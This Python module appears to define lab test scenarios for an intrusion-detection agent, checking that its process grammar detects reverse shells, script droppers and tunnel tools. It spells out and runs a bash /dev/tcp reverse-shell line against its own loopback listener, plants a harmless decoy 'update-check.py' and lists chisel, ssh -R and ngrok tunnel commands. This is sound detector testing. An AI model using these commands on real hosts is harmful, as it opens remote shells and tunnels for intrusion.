"""Process-execution scenarios: decoy command lines that look like a shell
hijack to the grammar, run for real under the lab gate.

The e2e pair spawns actual processes so the agent's own poller, grammar and
responder do the work. The `exploit_attempt` entry is not a scenario at all: no
detector in this tree emits that class, and saying so is the result.
"""

from __future__ import annotations

import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time

from ..node import LabError
from ..registry import DETECTOR, E2E, SKIP, Expect, Run, Scenario

# Loopback, our own port, opened by this process: the decoy needs a peer or bash
# gives up before the agent's next poll. No third party receives a packet.
LISTEN_PORT = 4444
REVERSE_SHELL_LINE = f"exec 3<>/dev/tcp/127.0.0.1/{LISTEN_PORT}; sh <&3 >&3 2>&3"
DROPPER_BODY = "import time\ntime.sleep(30)\n"

TUNNEL_LINES = (
    ("chisel client", "chisel client 203.0.113.40:9000 reverse:socks"),
    ("ssh -R", "ssh -R 0.0.0.0:2222:localhost:22 relay@example.invalid"),
    ("ngrok", "ngrok http 8080"),
)


def _listener(run: Run) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", LISTEN_PORT))
    sock.listen(4)
    sock.settimeout(1.0)
    run.scratch["listener"] = sock
    return sock


def _adopt(sock: socket.socket, run: Run) -> None:
    """Hold one client open so the decoy shell does not exit before it is seen."""
    deadline = time.time() + run.scratch.get("hold_until", 0.0)
    try:
        while time.time() < deadline:
            try:
                client, _ = sock.accept()
            except socket.timeout:
                continue
            client.settimeout(2.0)
            run.scratch.setdefault("clients", []).append(client)
    except OSError:
        pass


def reverse_shell(run: Run, expect: Expect) -> None:
    _listener(run)
    run.scratch["hold_until"] = time.time() + 20.0
    import threading

    threading.Thread(target=_adopt, args=(run.scratch["listener"], run), daemon=True).start()
    child = subprocess.Popen(["bash", "-c", REVERSE_SHELL_LINE])
    run.children.append(child)
    expect.subject = f"local:{child.pid}"
    run.say(f"    spawned pid {child.pid}: bash -c {REVERSE_SHELL_LINE!r} against a lab listener")


def dropper_exec(run: Run, expect: Expect) -> None:
    directory = _quarantine_dir(run)
    run.scratch["dropper_dir"] = tempfile.mkdtemp(prefix="swarm-lab-dropper-", dir=directory)
    script = os.path.join(run.scratch["dropper_dir"], "update-check.py")
    with open(script, "w", encoding="utf-8") as handle:
        handle.write(DROPPER_BODY)
    os.chmod(script, 0o755)
    child = subprocess.Popen([sys.executable, script], cwd=directory)
    run.children.append(child)
    expect.subject = f"local:{child.pid}"
    run.say(f"    interpreter pid {child.pid} running {script} from a directory the agent quarantines from")


def _quarantine_dir(run: Run) -> str:
    """The dropper rule only fires for a script under one of this node's own
    `quarantine_dirs`, so plant it where this node says payload files land."""
    for candidate in run.target.config.process.get("quarantine_dirs", []):
        if os.path.isdir(candidate) and os.access(candidate, os.W_OK | os.X_OK):
            return candidate
    raise LabError(f"{run.target.name} has no writable quarantine directory configured "
                   f"({run.target.config.process.get('quarantine_dirs')}), so a dropper script "
                   "has nowhere legitimate-looking to be planted")


def cleanup_children(run: Run, scenario: Scenario) -> None:
    for child in run.children:
        if child.poll() is None:
            child.terminate()
    for child in run.children:
        try:
            child.wait(timeout=2.0)
        except subprocess.TimeoutExpired:
            child.kill()
    run.children.clear()
    listener = run.scratch.pop("listener", None)
    if listener is not None:
        for client in run.scratch.pop("clients", []):
            try:
                client.close()
            except OSError:
                pass
        listener.close()
    directory = run.scratch.pop("dropper_dir", "")
    if directory:
        shutil.rmtree(directory, ignore_errors=True)


# ---- detector level --------------------------------------------------------
def _assess_line(line: str, workdir: str = "/home/user"):
    """Run the real grammar over a command line without ever starting it."""
    from ...detect.procs import ProcessWatcher
    from ...events import ProcessRecord

    parts = line.split(" ")
    record = ProcessRecord(
        pid=999_999, ppid=1, uid=1000, comm=parts[0], cmdline=tuple(parts),
        exe=f"/usr/bin/{parts[0]}", cwd=workdir, started_at=time.time(), state="S",
    )
    watcher = ProcessWatcher(config={"quarantine_dirs": ["/tmp"]}, netview=_NoConnections(), emit=lambda threat: None)
    return watcher.assess(record)


class _NoConnections:
    def connections_of(self, pid: int) -> list:
        return []


def tunnel_tool(run: Run, expect: Expect) -> None:
    """Score the tunnel signatures the way the grammar would, in this process."""
    results = []
    for label, line in TUNNEL_LINES:
        assessment = _assess_line(line)
        results.append((label, getattr(assessment, "attack", ""), getattr(assessment, "confidence", 0.0)))
    run.scratch["tunnel_lines"] = results
    hits = [item for item in results if item[1] == "tunnel_tool"]
    run.say(f"    grammar classified {len(hits)}/{len(results)} lines as tunnel_tool: "
            + ", ".join(f"{label}={confidence}" for label, _attack, confidence in results))
    if len(hits) < len(results):
        raise AssertionError("tunnel grammar no longer classifies its own signatures")


def scenarios() -> list[Scenario]:
    return [
        Scenario(
            attack="reverse_shell",
            name="bash /dev/tcp redirect with a dup2'd shell",
            level=E2E,
            run=reverse_shell,
            expects=(Expect(attack="reverse_shell"),),
            deadline=30.0,
            cleanup=cleanup_children,
            note="a live process the agent's own poller finds; kill and block are planned, "
                 "and in monitor mode nothing is actually killed",
        ),
        Scenario(
            attack="dropper_exec",
            name="interpreter executing a script from /tmp",
            level=E2E,
            run=dropper_exec,
            expects=(Expect(attack="dropper_exec", actions=0),),
            deadline=30.0,
            cleanup=cleanup_children,
            note="dropper_path_exec only fires for a path under a configured quarantine directory",
        ),
        Scenario(
            attack="tunnel_tool",
            name="chisel / ssh -R / ngrok command lines",
            level=DETECTOR,
            run=tunnel_tool,
            expects=(Expect(attack="tunnel_tool"),),
            why="an e2e run would mean installing and running a real tunnel client on this host; "
                "the grammar is scored here instead, and 0.45 is below the 0.5 emit threshold, "
                "so a bare tunnel tool needs a second indicator before it becomes an incident",
        ),
        Scenario(
            attack="exploit_attempt",
            name="",
            level=SKIP,
            run=None,
            expects=(),
            why="no detector in this tree emits exploit_attempt: the vocabulary declares the class "
                "(signals.py) and the weighted grammar maps the same command lines to reverse_shell "
                "(detect/procs.py), so nothing can ever raise it",
            note="declared in signals.ATTACKS, unreachable in practice",
        ),
    ]
